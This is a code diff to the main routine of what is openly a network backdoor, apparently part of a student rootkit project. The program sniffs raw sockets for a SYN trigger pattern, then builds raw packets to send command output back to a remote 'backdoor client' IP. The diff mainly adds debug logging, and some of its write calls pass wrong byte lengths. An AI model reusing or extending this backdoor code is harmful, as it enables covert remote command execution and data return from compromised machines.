@@ -82,7 +82,7 @@ int main(int argc, char* argv[]){
     //ordered to execute via the network backdoor
     //int bpf_map_fd = bpf_map_get_fd_by_id()
 
-    int fd = open("/tmp/execve_hijack", O_RDWR | O_CREAT | O_TRUNC, 0666);
+    int fd = open("/home/osboxes/TFG/src/log", O_RDWR | O_CREAT | O_TRUNC, 0666);
     
     int ii = 0;
     while(*(timestr+ii)!='\0'){
@@ -99,11 +99,15 @@ int main(int argc, char* argv[]){
 
     write(fd, "\n", 1);
 
-    close(fd);
+    
 
-
+    write(fd, "Sniffing...\n", 13);
     packet_t packet = rawsocket_sniff_pattern(CC_PROT_SYN);
-
+    if(packet.ipheader == NULL){
+        write(fd, "Failed to open rawsocket\n", 1);
+        return -1;
+    }
+    write(fd, "Sniffed\n", 9);
     //TODO GET THE IP FROM THE BACKDOOR CLIENT
     char* local_ip = getLocalIpAddress();
     char remote_ip[16];
@@ -112,6 +116,8 @@ int main(int argc, char* argv[]){
     
     packet_t packet_ack = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, CC_PROT_ACK);
     if(rawsocket_send(packet_ack)<0){
+        write(fd, "Failed to open rawsocket\n", 1);
+        close(fd);
         return -1;
     }
 
@@ -136,6 +142,8 @@ int main(int argc, char* argv[]){
                 strcat(payload_buf, res);
                 packet_t packet_res = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, payload_buf);
                 if(rawsocket_send(packet_res)<0){
+                    write(fd, "Failed to open rawsocket\n", 1);
+                    close(fd);
                     return -1;
                 }
                 free(payload_buf);
@@ -144,5 +152,6 @@ int main(int argc, char* argv[]){
         }
     }
 
+    close(fd);
     return 0;
 }
